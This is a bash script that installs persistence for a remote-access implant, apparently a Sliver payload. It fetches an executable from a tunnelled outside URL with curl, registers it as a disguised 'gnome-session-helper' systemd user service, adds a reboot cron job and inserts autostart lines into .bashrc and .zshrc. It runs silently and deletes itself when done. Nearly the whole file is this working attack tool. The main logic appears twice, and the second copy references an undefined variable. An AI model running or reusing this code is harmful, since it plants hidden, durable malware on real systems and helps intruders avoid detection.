#!/bin/bash

# ==========================================================================
# Author: l0n3m4n
# Version: 1.2
# Date: 2024-06-10
# Title: install_implant.sh
# Robust User-mode Persistence Installer (systemd + cron + bashrc/zshrc)
# ==========================================================================
# This script establishes robust persistence for non-root target user 
# target distributions likely work on Ubuntu, Debian, Fedora, and CentOS servers 
# Not work in containerized environments like Docker or Kubernetes.
# ==========================================================================
# USE ONLY FOR AUTHORIZED TESTING IM NOT RESPONSIBLE FOR ANY MISUSE.
# ==========================================================================


# --- Configuration ---
# User-provided payload URL (download location)
PAYLOAD_URL="https://fairfield-dentists-chronic-discussing.trycloudflare.com/implant_sliver.elf"
# User-provided implant name 
IMPLANT_NAME="implant_sliver.elf"

# Stealthier destination for the payload
# Mimics a legitimate system directory for user-specific binaries/data
PAYLOAD_DIR="$HOME/.local/share/systemd/user"
DEST_PATH="$PAYLOAD_DIR/$IMPLANT_NAME"

# Systemd service configuration
# Service name designed to blend in with legitimate systemd services
SERVICE_NAME="gnome-session-helper.service"
SERVICE_FILE="$HOME/.config/systemd/user/$SERVICE_NAME"
SERVICE_DESCRIPTION="GNOME Session Helper (Systemd User Persistence)"

# Cron job configuration
# Runs the implant on reboot, and also checks/restarts the systemd service
CRON_JOB_ENTRY="@reboot (sleep 10 && $DEST_PATH --check-service > /dev/null 2>&1) &"

# Bashrc/Zshrc modification
# Attempts to run the implant on new shell sessions if not already running
# Uses 'pgrep -f' to find the implant by its full path/name
SHELLRC_ENTRY="if [ -f \"$DEST_PATH\" ] && ! pgrep -f \"$IMPLANT_NAME\" > /dev/null; then nohup \"$DEST_PATH\" > /dev/null 2>&1 & disown; fi"

# --- Logging Configuration ---
# Set to 'true' for silent operation (no console output)
# Set to 'false' for verbose output (for testing/debugging)
SILENT_MODE=true

# --- Functions ---
log_message() {
    if [ "$SILENT_MODE" = false ]; then
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1"
    fi
}

# Function to check if a process is running
is_process_running() {
    pgrep -f "$1" > /dev/null
}

# --- Main Execution ---

log_message "Starting robust persistence setup for '$IMPLANT_NAME'..."

# Flag to track overall success
SETUP_SUCCESS=true

# Ensure necessary directories exist
log_message "Ensuring necessary directories exist..."
mkdir -p "$PAYLOAD_DIR" || { log_message "[!] Failed to create $PAYLOAD_DIR. Exiting."; SETUP_SUCCESS=false; }
mkdir -p "$HOME/.config/systemd/user" || { log_message "[!] Failed to create $HOME/.config/systemd/user. Exiting."; SETUP_SUCCESS=false; }

if ! $SETUP_SUCCESS; then
    log_message "[!] Directory creation failed. Aborting setup."
    exit 1
fi

# 1. Download and prepare payload
if [ ! -f "$DEST_PATH" ]; then
    log_message "Downloading payload from '$PAYLOAD_URL' to '$DEST_PATH'..."
    curl -fsSL "$PAYLOAD_URL" -o "$DEST_PATH"

    if [ $? -ne 0 ]; then
        log_message "[!] Download failed for '$PAYLOAD_URL'. Check URL and network connectivity. Persistence setup aborted."
        SETUP_SUCCESS=false
    else
        chmod +x "$DEST_PATH" || { log_message "[!] Failed to make payload executable. Exiting."; SETUP_SUCCESS=false; }
        log_message "Payload downloaded and made executable."
    fi
else
    log_message "Payload already exists at '$DEST_PATH'. Skipping download."
fi

# Verify payload exists and is executable
if [ ! -x "$DEST_PATH" ]; then
    log_message "[!] Payload '$DEST_PATH' is not executable or does not exist. Aborting setup."
    SETUP_SUCCESS=false
fi

if ! $SETUP_SUCCESS; then
    log_message "[!] Payload setup failed. Aborting."
    exit 1
fi

# 2. Systemd User Service Persistence
log_message "Setting up systemd user service: '$SERVICE_NAME'..."
cat << EOF > "$SERVICE_FILE"
[Unit]
Description=$SERVICE_DESCRIPTION
After=network.target

[Service]
ExecStart=$DEST_PATH
Restart=always
RestartSec=5
# Consider adding PrivateTmp=true, NoNewPrivileges=true for enhanced isolation
# However, these might interfere with some implants. Test thoroughly.

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
if [ $? -ne 0 ]; then log_message "[!] systemctl --user daemon-reload failed."; SETUP_SUCCESS=false; fi
systemctl --user enable "$SERVICE_NAME"
if [ $? -ne 0 ]; then log_message "[!] systemctl --user enable $SERVICE_NAME failed."; SETUP_SUCCESS=false; fi
systemctl --user start "$SERVICE_NAME"
if [ $? -ne 0 ]; then log_message "[!] systemctl --user start $SERVICE_NAME failed."; SETUP_SUCCESS=false; fi
log_message "Systemd service '$SERVICE_NAME' configured and started (if not already running)."


# 3. .bashrc Persistence (Fallback/Redundancy)
log_message "Adding persistence to ~/.bashrc..."
if [ -f "$HOME/.bashrc" ]; then
    if ! grep -qF "$SHELLRC_ENTRY" "$HOME/.bashrc"; then
        echo -e "\n# User-mode persistence entry - DO NOT REMOVE MANUALLY IF YOU DID NOT SET THIS UP" >> "$HOME/.bashrc" >> /dev/null 2>&1 # Redirect output to /dev/null
        echo "$SHELLRC_ENTRY" >> "$HOME/.bashrc" >> /dev/null 2>&1 # Redirect output to /dev/null
        if [ $? -ne 0 ]; then log_message "[!] Failed to modify ~/.bashrc."; SETUP_SUCCESS=false; fi
        log_message "~/.bashrc modified. Implant will attempt to run on new Bash shell sessions."
    else
        log_message "~/.bashrc already contains persistence entry. Skipping modification."
    fi
else
    log_message "~/.bashrc not found. Skipping Bash shell persistence."
fi

# 4. .zshrc Persistence (Fallback/Redundancy)
log_message "Adding persistence to ~/.zshrc..."
if [ -f "$HOME/.zshrc" ]; then
    if ! grep -qF "$SHELLRC_ENTRY" "$HOME/.zshrc"; then
        echo -e "\n# User-mode persistence entry - DO NOT REMOVE MANUALLY IF YOU DID NOT SET THIS UP" >> "$HOME/.zshrc" >> /dev/null 2>&1 # Redirect output to /dev/null
        echo "$SHELLRC_ENTRY" >> "$HOME/.zshrc" >> /dev/null 2>&1 # Redirect output to /dev/null
        if [ $? -ne 0 ]; then log_message "[!] Failed to modify ~/.zshrc."; SETUP_SUCCESS=false; fi
        log_message "~/.zshrc modified. Implant will attempt to run on new Zsh shell sessions."
    else
        log_message "~/.zshrc already contains persistence entry. Skipping modification."
    fi
else
    log_message "~/.zshrc not found. Skipping Zsh shell persistence."
fi

# 5. User Cron Job Persistence (Fallback/Redundancy)
log_message "Adding user cron job for persistence..."
# Read current crontab, filter out existing entry if any, then add new entry
(crontab -l 2>/dev/null | grep -v -F "$CRON_JOB_ENTRY"; echo "$CRON_JOB_ENTRY") | crontab -
if [ $? -ne 0 ]; then log_message "[!] Failed to add cron job."; SETUP_SUCCESS=false; fi
log_message "Cron job added. Implant will attempt to run on reboot and periodically check service."

log_message "[+] Robust user persistence setup complete for '$IMPLANT_NAME'."
log_message "[+] Verification steps:"
log_message "    - Check systemd status: systemctl --user status $SERVICE_NAME"
log_message "    - Check cron jobs: crontab -l"
log_message "    - Check ~/.bashrc: cat ~/.bashrc"
log_message "    - Check ~/.zshrc: cat ~/.zshrc"
log_message "    - Check running processes: pgrep -f '$IMPLANT_NAME'"
log_message "[!!!] This script is for AUTHORIZED TESTING ONLY. Misuse can lead to severe consequences."

# --- Self-deletion after successful setup ---
if $SETUP_SUCCESS; then
    log_message "[*] All persistence mechanisms successfully established. Removing installer script traces..."
    # Use 'rm -- "$0"' to safely delete the currently executing script
    rm -- "$0" &>/dev/null
    if [ $? -eq 0 ]; then
        log_message "[+] Installer script '$0' successfully deleted."
    else
        log_message "[!] Failed to delete installer script '$0'. Manual removal required."
    fi
else
    log_message "[!] Persistence setup encountered errors. Installer script '$0' will NOT be deleted."
    log_message "[!] Please review logs for failures and manually remove if necessary."
fi

log_message "Ensuring necessary directories exist..."
mkdir -p "$PAYLOAD_DIR" || { log_message "[!] Failed to create $PAYLOAD_DIR. Exiting."; SETUP_SUCCESS=false; }
mkdir -p "$HOME/.config/systemd/user" || { log_message "[!] Failed to create $HOME/.config/systemd/user. Exiting."; SETUP_SUCCESS=false; }

if ! $SETUP_SUCCESS; then
    log_message "[!] Directory creation failed. Aborting setup."
    exit 1
fi

# 1. Download and prepare payload
if [ ! -f "$DEST_PATH" ]; then
    log_message "Downloading payload from '$PAYLOAD_URL' to '$DEST_PATH'..."
    curl -fsSL "$PAYLOAD_URL" -o "$DEST_PATH"

    if [ $? -ne 0 ]; then
        log_message "[!] Download failed for '$PAYLOAD_URL'. Check URL and network connectivity. Persistence setup aborted."
        SETUP_SUCCESS=false
    else
        chmod +x "$DEST_PATH" || { log_message "[!] Failed to make payload executable. Exiting."; SETUP_SUCCESS=false; }
        log_message "Payload downloaded and made executable."
    fi
else
    log_message "Payload already exists at '$DEST_PATH'. Skipping download."
fi

# Verify payload exists and is executable
if [ ! -x "$DEST_PATH" ]; then
    log_message "[!] Payload '$DEST_PATH' is not executable or does not exist. Aborting setup."
    SETUP_SUCCESS=false
fi

if ! $SETUP_SUCCESS; then
    log_message "[!] Payload setup failed. Aborting."
    exit 1
fi

# 2. Systemd User Service Persistence
log_message "Setting up systemd user service: '$SERVICE_NAME'..."
cat << EOF > "$SERVICE_FILE"
[Unit]
Description=$SERVICE_DESCRIPTION
After=network.target

[Service]
ExecStart=$DEST_PATH
Restart=always
RestartSec=5
# Consider adding PrivateTmp=true, NoNewPrivileges=true for enhanced isolation
# However, these might interfere with some implants. Test thoroughly.

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
if [ $? -ne 0 ]; then log_message "[!] systemctl --user daemon-reload failed."; SETUP_SUCCESS=false; fi
systemctl --user enable "$SERVICE_NAME"
if [ $? -ne 0 ]; then log_message "[!] systemctl --user enable $SERVICE_NAME failed."; SETUP_SUCCESS=false; fi
systemctl --user start "$SERVICE_NAME"
if [ $? -ne 0 ]; then log_message "[!] systemctl --user start $SERVICE_NAME failed."; SETUP_SUCCESS=false; fi
log_message "Systemd service '$SERVICE_NAME' configured and started (if not already running)."


# 3. .bashrc Persistence (Fallback/Redundancy)
log_message "Adding persistence to ~/.bashrc..."
if ! grep -qF "$BASHRC_ENTRY" "$HOME/.bashrc"; then
    echo -e "\n# User-mode persistence entry - DO NOT REMOVE MANUALLY IF YOU DID NOT SET THIS UP" >> "$HOME/.bashrc" >> /dev/null 2>&1 # Redirect output to /dev/null
    echo "$BASHRC_ENTRY" >> "$HOME/.bashrc" >> /dev/null 2>&1 # Redirect output to /dev/null
    if [ $? -ne 0 ]; then log_message "[!] Failed to modify ~/.bashrc."; SETUP_SUCCESS=false; fi
    log_message "~/.bashrc modified. Implant will attempt to run on new shell sessions."
else
    log_message "~/.bashrc already contains persistence entry. Skipping modification."
fi

# 4. User Cron Job Persistence (Fallback/Redundancy)
log_message "Adding user cron job for persistence..."
# Read current crontab, filter out existing entry if any, then add new entry
(crontab -l 2>/dev/null | grep -v -F "$CRON_JOB_ENTRY"; echo "$CRON_JOB_ENTRY") | crontab -
if [ $? -ne 0 ]; then log_message "[!] Failed to add cron job."; SETUP_SUCCESS=false; fi
log_message "Cron job added. Implant will attempt to run on reboot and periodically check service."

log_message "[+] Robust user persistence setup complete for '$IMPLANT_NAME'."
log_message "[+] Verification steps:"
log_message "    - Check systemd status: systemctl --user status $SERVICE_NAME"
log_message "    - Check cron jobs: crontab -l"
log_message "    - Check ~/.bashrc: cat ~/.bashrc"
log_message "    - Check running processes: pgrep -f '$IMPLANT_NAME'"
log_message "[!!!] This script is for AUTHORIZED TESTING ONLY. Misuse can lead to severe consequences."

# --- Self-destruction after successful setup ---
if $SETUP_SUCCESS; then
    log_message "[*] All persistence mechanisms successfully established. Removing installer script traces..."
    # Use 'rm -- "$0"' to safely delete the currently executing script
    rm -- "$0" &>/dev/null
    if [ $? -eq 0 ]; then
        log_message "[+] Installer script '$0' successfully deleted."
    else
        log_message "[!] Failed to delete installer script '$0'. Manual removal required."
    fi
else
    log_message "[!] Persistence setup encountered errors. Installer script '$0' will NOT be deleted."
    log_message "[!] Please review logs for failures and manually remove if necessary."
fi
